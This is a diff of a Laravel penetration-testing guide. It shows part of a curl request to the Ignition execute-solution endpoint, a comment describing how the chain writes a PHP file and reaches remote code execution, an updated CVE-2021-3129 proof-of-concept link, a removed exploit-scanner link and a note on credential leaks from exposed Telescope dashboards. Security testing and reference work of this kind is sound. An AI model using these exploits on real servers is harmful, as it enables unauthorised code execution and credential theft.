@@ -83,7 +83,7 @@ curl -sk -X POST https://target/_ignition/execute-solution \
   }'
 # Chain crafts a malicious PHP file at /tmp/x.php; subsequent include via LFI primitive yields RCE.
 ```
-Full PoC: https://github.com/SecPro-Team/laravel-ignition-rce
+Full PoC: https://github.com/zhzyker/CVE-2021-3129
 
 ### Telescope / Horizon exposed
 - Telescope dashboard exposes requests, queries, exceptions — request bodies often contain credentials.
@@ -141,4 +141,3 @@ Laravel's `VerifyCsrfToken` middleware can be excluded for specific routes (`$ex
 - phpggc Laravel gadgets: https://github.com/ambionics/phpggc
 - nuclei laravel templates: https://github.com/projectdiscovery/nuclei-templates (search laravel)
 - Spatie Ignition: https://github.com/spatie/laravel-ignition
-- larasploit (Laravel-specific scanner): https://github.com/blackmamba1024/Laravel_Exploit_Vulnerability
